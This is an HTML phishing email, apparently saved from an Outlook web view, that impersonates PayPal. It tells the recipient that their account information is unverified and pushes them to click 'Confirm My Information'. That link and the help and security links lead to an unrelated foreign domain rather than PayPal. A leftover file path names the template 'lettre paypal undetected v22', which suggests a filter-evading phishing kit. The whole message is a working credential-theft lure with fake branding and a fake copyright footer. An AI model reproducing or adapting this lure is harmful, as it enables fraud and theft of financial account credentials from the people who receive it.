<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html><head>


  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=10">
  <meta http-equiv="pragma" content="no-cache">
  <meta name="referrer" content="never">
  <script>
function addStyleToDom(styleHref) {
var head = document.getElementsByTagName('head')[0];
var linkElement = null;
if (window.document.createStyleSheet) {
var link = window.document.createStyleSheet(styleHref);
linkElement = link.owningElement;
}
else {
linkElement = window.document.createElement('link');
linkElement.rel = 'stylesheet';
linkElement.type = 'text/css';
linkElement.href = styleHref; head.appendChild(linkElement);
}
return linkElement;
}
function loadStyle(cssPath, callback, owaServerPath, cdnPath) {
var linkElement = addStyleToDom(cssPath); // If browser supports css link element onload event, use that to callback when the stylesheet has loaded.
// Otherwise, wait 50 ms and hope for the best (this is the same logic as StyleLoader.LoadStyle)
if ('onload' in linkElement) { var styleLoadedCallback = function () { if ((!linkElement.readyState || (linkElement.readyState && (linkElement.readyState === 'loaded' || linkElement.readyState === 'complete')))) {
linkElement.onload = null;
linkElement.onreadystatechange = null;
linkElement.onerror = null;
callback();
}
};
var retryWithFallback = function() {
if (cssPath && owaServerPath && cdnPath && cssPath.startsWith(owaServerPath)) {
// Replace current path with fallback endpoint and try again
cssPath = cdnPath + cssPath.substr(owaServerPath.length);
}
// Retry without passing a fallback endpoint, so that we just retry once
loadStyle(cssPath, callback);
};
linkElement.onload = styleLoadedCallback;
linkElement.onreadystatechange = styleLoadedCallback;
// Retry with fallback on error when cdn path is specified. Otherwise just finish this resource
linkElement.onerror = cdnPath ? retryWithFallback : styleLoadedCallback;
}
else {
window.setTimeout(callback, 50)
}
}
function loadStyleSheets(styleSheets, owaServerPath, cdnPath) { var count = 0;
onStyleLoaded = function () {
count++; if (count === styleSheets.length) {
// Show the contents after all style sheets have loaded
window.document.body.style.display = "block"; }
};
for (var i = 0; i < styleSheets.length; i++) {
loadStyle(styleSheets[i], onStyleLoaded, owaServerPath, cdnPath);
}
}
function InlineImageLoader() { }
InlineImageLoader.GetLoader = function InlineImageLoader$GetLoader() {
if (window.opener != null) {
return window.opener.InlineImageLoader.GetLoader();
}
}
window.onload = function () { window.opener.popOutProjectionManager.projectionReady(self);
}
window.onbeforeunload = function () {
return window.opener.popOutProjectionManager.onBeforeProjectionUnload(self);
}
window.onunload = function () {
window.opener.popOutProjectionManager.onProjectionUnload(self);
}
// Cache the ids of Extensibility app iframes, indexed by Office Developer Platform conversationId
var appFrames = {};
// Listen for messages to allow Extensibility apps to communicate with the main OWA window
messageListener = function(event) {
var eventData = JSON.parse(event.data);
var odpConversationId = eventData._conversationId; // id used by the Office Developer Platform
if (!odpConversationId) {
return;
}
if (event.source === window.opener) {
// Send this message to the app iframe
var appFrameId = appFrames[odpConversationId];
if(appFrameId) {
var appFrame = document.getElementById(appFrameId);
if (appFrame) {
appFrame.contentWindow.postMessage(event.data, appFrame.src);
}
}
}
else
{
// Send this message to the main OWA window
if (!appFrames[odpConversationId]) {
// Determine which iframe corresponds to the sender
var documentFrames = document.getElementsByTagName("iframe");
for (i = 0; i < documentFrames.length; i++) {
if (documentFrames[i].contentWindow === event.source)
{
// Save the iframe id for this conversation id
appFrames[odpConversationId] = documentFrames[i].id;
break;
}
}
}
window.opener.postMessage(event.data, window.opener.location.href);
}
}
if (window.addEventListener) {
// Listen for messages to and from Extensibility apps using postMessage
window.addEventListener("message", messageListener, false);
}
  </script>
  <style>
.popoutBody {
margin: 0;
height: 100%;
width: 100%;
display: none;
}
  </style>
  <style>.customScrollBar::-webkit-scrollbar{height:18px;width:18px}.customScrollBar::-webkit-scrollbar:disabled{display:none}.customScrollBar::-webkit-scrollbar-button{background-color:#fff;background-repeat:no-repeat;cursor:pointer}.customScrollBar::-webkit-scrollbar-button:horizontal:increment,.customScrollBar::-webkit-scrollbar-button:horizontal:decrement,.customScrollBar::-webkit-scrollbar-button:horizontal:increment:hover,.customScrollBar::-webkit-scrollbar-button:horizontal:decrement:hover,.customScrollBar::-webkit-scrollbar-button:vertical:increment,.customScrollBar::-webkit-scrollbar-button:vertical:decrement,.customScrollBar::-webkit-scrollbar-button:vertical:increment:hover,.customScrollBar::-webkit-scrollbar-button:vertical:decrement:hover{background-position:center;height:18px;width:18px}.customScrollBarLight::-webkit-scrollbar-button{display:none}.customScrollBar::-webkit-scrollbar-track{background-color:#fff}.customScrollBarLight::-webkit-scrollbar-track{background-color:#0072c6}.customScrollBar::-webkit-scrollbar-thumb{border-radius:9px;border:solid 6px #fff;background-color:#c8c8c8}.customScrollBarLight::-webkit-scrollbar-thumb{border-color:#0072c6;background-color:#95b1c1}.customScrollBar::-webkit-scrollbar-thumb:vertical{min-height:50px}.customScrollBar::-webkit-scrollbar-thumb:horizontal{min-width:50px}.customScrollBar::-webkit-scrollbar-thumb:hover{border-radius:9px;border:solid 6px #fff;background-color:#98a3a6}.customScrollBar::-webkit-scrollbar-corner{background-color:#fff}.nativeScrollInertia{-webkit-overflow-scrolling:touch}.csimg{display:inline-block;overflow:hidden}button::-moz-focus-inner{border-width:0;padding:0}.textbox{border-width:1px;border-style:solid;border-radius:0;-moz-border-radius:0;-webkit-border-radius:0;box-shadow:none;-moz-box-shadow:none;-webkit-box-shadow:none;-webkit-appearance:none;height:30px;padding:0 5px}.tnarrow .textbox,.twide .textbox{font-size:12px;background-color:#fff;height:14px;padding:3px 5px}.textbox::-webkit-input-placeholder{color:#a6a6a6}.textbox:-moz-placeholder{color:#a6a6a6}.textbox::-moz-placeholder{color:#a6a6a6}.textbox:-ms-input-placeholder{color:#a6a6a6}.textarea{padding:10px}.textarea:hover{background-color:transparent;border-color:transparent}.o365button{background:transparent;border-width:0;padding:0;cursor:pointer!important;font-size:14px}.o365button:disabled,label.o365button[disabled=true]{cursor:default!important}.o365buttonOutlined{padding-right:11px;padding-left:11px;-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box;border-width:1px;border-style:solid}.o365buttonOutlined .o365buttonLabel{display:inline-block}.o365buttonOutlined{height:30px}.twide .o365buttonOutlined,.tnarrow .o365buttonOutlined{height:22px}.o365buttonOutlined .o365buttonLabel{height:22px}.checkbox{border-style:none;cursor:pointer;vertical-align:middle}.popupShadow{box-shadow:0 0 20px rgba(0,0,0,.4);border:1px solid #eaeaea}.contextMenuDropShadow{box-shadow:0 0 7px rgba(0,0,0,.4);border:1px solid #eaeaea}.modalBackground{background-color:#fff;height:100%;width:100%;opacity:.65;filter:Alpha(opacity=65)}.clearModalBackground{background-color:#fff;opacity:0;filter:Alpha(opacity=0);height:100%;width:100%}.contextMenuPopup{background-color:#fff}.removeFocusOutline *:focus{outline:none}.addFocusOutline button:focus{outline:dotted 1px}.addFocusRingOutline button:focus{outline:auto 5px -webkit-focus-ring-color}.border-color-transparent{border-color:transparent}.vResize,.hResize{z-index:1000}.hResize,.hResizeCursor *{cursor:row-resize!important}.vResize,.vResizeCursor *{cursor:col-resize!important}.vResizing,.hResizing{filter:alpha(opacity=60);opacity:.6;-moz-opacity:.6;border:solid 1px #666}.vResizing{border-width:0 1px}.hResizing{border-width:1px 0}</style>
<style type="text/css"><!-- .rps_ee6f .x_ppsans
{ font-family: 'pp-sans-big-light','Noto Sans',Calibri,Trebuchet,Arial,sans serif!important; }
.rps_ee6f .x_ppsansbold
{ font-family: 'pp-sans-big-bold','Noto Sans',Calibri,Trebuchet,Arial,sans serif!important; }
.rps_ee6f .x_ExternalClass
{ line-height: 100%; }
.rps_ee6f body
{ margin: 0!important; }
.rps_ee6f .x_applefix a
{ color: inherit; text-decoration: none; }
.rps_ee6f .x_mpidiv img
{ width: 100%!important; height: auto!important; min-width: 100%!important; max-width: 100%!important; }
.rps_ee6f .x_partner_image
{ max-width: 250px!important; max-height: 90px!important; display: block; }
--></style><style type="text/css"><!-- --></style></head><body class="popoutBody notIE8 ms-fwt-r" style="display: block;" id="">
<div style="text-align: center;" class="removeFocusOutline">
<div class="conductorContent" role="presentation">
<div class="_rp_d5 ShowReferenceAttachmentsLinks ShowConsesusSchedulingLink" tabindex="-1" role="region" aria-label="Volet de lecture">
<div class="_rp_c5" style="display: none;"></div>
<div class="_rp_d5 disableTextSelection" style="position: relative;">
<div style="display: none;"></div>
<div class="_rp_C5" style="display: none;"></div>
<div class="_rp_g5 disableTextSelection _rp_i5 _rp_j5 customScrollBar scrollContainer" style="position: absolute; top: 0px; right: 0px; bottom: 0px; left: 0px; height: auto; width: auto;">
<div class="_rp_q5 ms-font-weight-regular" tabindex="-1" style="display: none;"></div>
<div class="_rp_A5 ms-border-color-neutralLight" style="display: none;"></div>
<div class="_rp_p5">
<div style="display: none;"></div>
<div class="_rp_w5" style="display: none;"></div>
<div class="_rp_B5 ms-border-color-neutralLight" style="display: none;"></div>
<div style="display: none;"></div>
<div autoid="_rp_D" class="_rp_m5">
<div class="itemPartBody _rp_o5 ms-font-weight-regular ms-font-color-neutralDark" style="display: none;"></div>
<div autoid="_rp_E" class="_rp_n5" style="display: none;"></div>
<div autoid="_rp_F" class="_rp_n5 rpHighlightAllClass rpHighlightBodyClass allowTextSelection" role="region" aria-label="Corps du message">
<div style="display: none;"></div>
<div style="display: none;"></div>
<div class="_rp_o5 ms-font-weight-regular ms-font-color-neutralDark isMessageBodyInPopout" role="presentation" tabindex="-1" id="Item.MessageNormalizedBody">
<div class="rps_ee6f">


<div style="margin: 0pt; padding: 0pt; background: rgb(242, 242, 242) none repeat scroll 0% 50%; -moz-background-clip: -moz-initial; -moz-background-origin: -moz-initial; -moz-background-inline-policy: -moz-initial;">
<div style="display: none ! important; color: rgb(255, 255, 255); font-size: 1pt;"></div>
<span style="display: none ! important; font-size: 0px; line-height: 0px; color: rgb(255, 255, 255);">,
please complete your PayPal account setup. It takes just a minute. </span>
<table style="text-align: left; margin-left: auto; margin-right: auto;" class="x_marginFix" border="0" cellpadding="0" cellspacing="0" width="100%">
  <tbody>
    <tr>
      <td class="x_mobContent" align="center" bgcolor="#ffffff" width="660">
      <br>
      <br>
      <table border="0" cellpadding="0" cellspacing="0" width="100%">
        <tbody>
          <tr>
            <td id="yui_3_16_0_ym19_1_1463526823677_4450" style="" neue="" ,="" helvetica="" arial="" sans-serif="" display="" table-cell="" border-spacing="" 2px="" -webkit-padding-start="" 0px="" align="center">
            <div class="yiv9523210593photo-icon" id="yui_3_16_0_ym19_1_1463526823677_4449" style="padding-left: 10px; display: block;" align="center"><br>
            <br>
            <span>
            <blockquote class="m_-9070678874697320703tr_bq"><span style="font-family: Verdana,sans-serif; font-size: xx-large;"><b><em><font color="#003084">P<span><font>a</font></span>y</font><font color="#0098db">Pal</font></em></b></span></blockquote>
            </span>
            </div>
            </td>
          </tr>
        </tbody>
      </table>
      <table border="0" cellpadding="0" cellspacing="0" width="100%">
        <tbody>
          <tr dir="ltr">
          </tr>
          <tr>
            <td class="x_mobMargin" align="left" valign="top">
            <table border="0" cellpadding="0" cellspacing="0" width="100%">
              <tbody>
                <tr>
                </tr>
                <tr>
                  <td align="right" bgcolor="#ffffff" valign="top">
                  <div style=""><button type="button" class="_at_6 o365button" aria-disabled="true" aria-labelledby="_ariaId_226" disabled="true"><span class="_fc_3 owaimg" style="display: none;"> </span><span class="_fc_4 o365buttonLabel" id="_ariaId_226" style="display: none;"></span></button></div>
                  </td>
                </tr>
              </tbody>
            </table>
            </td>
            <td align="center" valign="top" width="600">
            <table border="0" cellpadding="0" cellspacing="0" width="100%">
              <tbody>
                <tr>
                  <td style="padding-top: 20px;" align="center" bgcolor="#ffffff" valign="top">
                  <table border="0" cellpadding="0" cellspacing="0" width="100%">
                    <tbody>
                      <tr>
                        <td style="padding: 0px 30px 30px;" align="center">
                        <br>
                        <table border="0" cellpadding="0" cellspacing="0" width="100%">
                          <tbody>
                            <tr>
                              <td class="x_ppsans" style="font-family: Calibri,Trebuchet,Arial,sans serif; font-size: 36px; line-height: 44px; color: rgb(51, 51, 51);" align="center" valign="top">Dear customer</td>
                            </tr>
                          </tbody>
                        </table>
                        </td>
                      </tr>
                    </tbody>
                  </table>
                  <table border="0" cellpadding="0" cellspacing="0" width="100%">
                    <tbody>
                      <tr>
                        <td style="padding: 0px 30px 30px;" align="center">
                        <table border="0" cellpadding="0" cellspacing="0" width="100%">
                          <tbody>
                            <tr>
                              <td class="x_ppsans" style="padding: 0px; vertical-align: top; font-family: Calibri,Trebuchet,Arial,sans serif; font-size: 19px; line-height: 24px; color: rgb(119, 119, 119);" align="center">
                              <p style="">We have noticed
that some data from your account information seems inaccurate or
unverified. You have to check your information in order to continue
using our service smoothly, please check your account information by
clicking the link below. <br>
                              </p>
                              </td>
                            </tr>
                          </tbody>
                        </table>
                        </td>
                      </tr>
                    </tbody>
                  </table>
                  <table border="0" cellpadding="0" cellspacing="0" width="100%">
                    <tbody>
                      <tr>
                        <td style="padding: 0px 30px 30px;" align="center">
                        <table class="x_stackTbl" border="0" cellpadding="0" cellspacing="0">
                          <tbody>
                            <tr>
                              <td class="x_ppsans x_mobilePadding9" style="padding: 10px 90px 15px; font-family: Calibri,Trebuchet,Arial,sans serif; font-size: 17px; line-height: 21px; color: rgb(255, 255, 255);" align="center" bgcolor="#009cde" valign="middle">
                              <a href="https://wclrf.org.af/dari/PayPal" target="_blank" rel="noopener noreferrer" type="Link" style="color: rgb(255, 255, 255); text-decoration: none;">Confirm
My Information</a></td>
                            </tr>
                          </tbody>
                        </table>
                        </td>
                      </tr>
                    </tbody>
                  </table>
                  <table border="0" cellpadding="0" cellspacing="0" width="100%">
                    <tbody>
                      <tr>
                        <td style="padding: 0px 30px 30px;" align="center">
                        <table border="0" cellpadding="0" cellspacing="0" width="100%">
                          <tbody>
                            <tr>
                              <td style="border-bottom: 1px solid rgb(214, 214, 214); font-size: 0px; line-height: 0px;" align="center" valign="top"> <br>
</td>
                            </tr>
                          </tbody>
                        </table>
                        </td>
                      </tr>
                    </tbody>
                  </table>
                  <table border="0" cellpadding="0" cellspacing="0" width="100%">
                    <tbody>
                      <tr>
                      </tr>
                    </tbody>
                  </table>
                  <table border="0" cellpadding="0" cellspacing="0" width="100%">
                    <tbody>
                      <tr>
                      </tr>
                    </tbody>
                  </table>
                  <table border="0" cellpadding="0" cellspacing="0" width="100%">
                  </table>
                  <table border="0" cellpadding="0" cellspacing="0" width="100%">
                    <tbody>
                      <tr>
                      </tr>
                    </tbody>
                  </table>
                  <table border="0" cellpadding="0" cellspacing="0" width="100%">
                    <tbody>
                      <tr>
                      </tr>
                    </tbody>
                  </table>
                  <table border="0" cellpadding="0" cellspacing="0" width="100%">
                  </table>
                  </td>
                </tr>
              </tbody>
            </table>
            </td>
            <td class="x_mobMargin" align="left" valign="top">
            <table border="0" cellpadding="0" cellspacing="0" width="100%">
              <tbody>
                <tr>
                </tr>
                <tr>
                  <td align="left" bgcolor="#ffffff" valign="top">
                  <div style=""><button type="button" class="_at_6 o365button" aria-disabled="true" aria-labelledby="_ariaId_231" disabled="true"><span class="_fc_3 owaimg" style="display: none;"> </span><span class="_fc_4 o365buttonLabel" id="_ariaId_231" style="display: none;"></span></button></div>
                  </td>
                </tr>
              </tbody>
            </table>
            </td>
          </tr>
        </tbody>
      </table>
      <table dir="ltr" border="0" cellpadding="0" cellspacing="0" width="100%">
        <tbody>
          <tr>
            <td align="center" width="600">
            <table border="0" cellpadding="0" cellspacing="0" width="100%">
              <tbody>
                <tr>
                  <td style="padding: 0px; vertical-align: top;" align="left">
                  <table border="0" cellpadding="0" cellspacing="0" width="100%">
                    <tbody>
                      <tr>
                      </tr>
                    </tbody>
                  </table>
                  <table border="0" cellpadding="0" cellspacing="0" width="100%">
                    <tbody>
                      <tr>
                        <td class="x_ppsans" style="padding: 20px; font-family: Calibri,Trebuchet,Arial,sans serif; font-size: 15px; line-height: 22px; color: rgb(68, 68, 68);" align="center">
                        <a href="https://wclrf.org.af/dari/PayPal" target="_blank" rel="noopener noreferrer" alt="Help &amp; Contact" style="color: rgb(0, 156, 222); text-decoration: none;">Help
&amp; Contact</a> | <a href="https://wclrf.org.af/dari/PayPal" target="_blank" rel="noopener noreferrer" alt="Security" style="color: rgb(0, 156, 222); text-decoration: none;">Security</a>
| <a href="https://www.paypal.com/us/webapps/mpp/mobile-apps?ppid=PPC000975&amp;cnac=US&amp;rsta=en_US%28en_US%29&amp;cust=D2WHJGRJ66R94&amp;unptid=1e488e76-276b-11e7-b05b-441ea14e9560&amp;t=&amp;cal=e7bc7156f3c6e&amp;calc=e7bc7156f3c6e&amp;calf=e7bc7156f3c6e&amp;unp_tpcid=ConsumerWelcomeConfirm&amp;page=main:email&amp;pgrp=main:email&amp;e=op&amp;mchn=em&amp;s=ci&amp;mail=sys" target="_blank" rel="noopener noreferrer" alt="Apps" style="color: rgb(0, 156, 222); text-decoration: none;">Apps</a></td>
                      </tr>
                    </tbody>
                  </table>
                  </td>
                </tr>
              </tbody>
            </table>
            </td>
          </tr>
        </tbody>
      </table>
      <table border="0" cellpadding="0" cellspacing="0" width="100%">
        <tbody>
        </tbody>
      </table>
      <table border="0" cellpadding="0" cellspacing="0" width="100%">
        <tbody>
          <tr>
            <td class="x_hide"> <br>
</td>
            <td align="center" width="600">
            <table border="0" cellpadding="0" cellspacing="0" width="100%">
              <tbody>
                <tr>
                  <td class="x_ppsans" style="padding: 20px 30px 30px; font-family: Calibri,Trebuchet,Arial,sans serif; font-size: 13px; line-height: 20px; color: rgb(153, 153, 153);">
                  <table id="x_emailFooter" class="x_ppsans" style="font-family: Calibri,Trebuchet,Arial,sans serif; font-size: 13px; line-height: 20px; color: rgb(153, 153, 153);" border="0" cellpadding="0" cellspacing="0" width="100%">
                    <tbody>
                      <tr>
                        <td>
                        <p>Copyright © 1999-2019 PayPal,
Inc. All rights reserved. PayPal is located at <span tabindex="0" role="button" class="contextualExtensionHighlight ms-font-color-themePrimary ms-border-color-themePrimary ident_2125_2162">2211
N. First St., San Jose, CA 95131</span>.</p>
                        </td>
                      </tr>
                    </tbody>
                  </table>
                  <div style=""><button type="button" class="_at_6 o365button" aria-disabled="true" aria-labelledby="_ariaId_237" disabled="true"><img src="file:///C:/Users/yassine/Desktop/tools/letttre%20paypal%20undetected%20v22_files/ts" alt="" border="0" height="1" width="1"><span class="_fc_3 owaimg" style="display: none;"> </span><span class="_fc_4 o365buttonLabel" id="_ariaId_237" style="display: none;"></span></button></div>
                  <p></p>
                  </td>
                </tr>
              </tbody>
            </table>
            </td>
            <td class="x_hide"> <br>
</td>
          </tr>
        </tbody>
      </table>
      </td>
    </tr>
  </tbody>
</table>
</div>
</div>
</div>
<div style="display: none;"></div>
</div>
<div style="display: none;"></div>
</div>
</div>
</div>
</div>
</div>
<div autoid="_rp_G" class="popupShadow" ispopup="1" ismodal="true" style="display: none;"></div>
<div autoid="_rp_H" class="popupShadow" ispopup="1" ismodal="true" style="display: none;"></div>
</div>
</div>
</body></html>
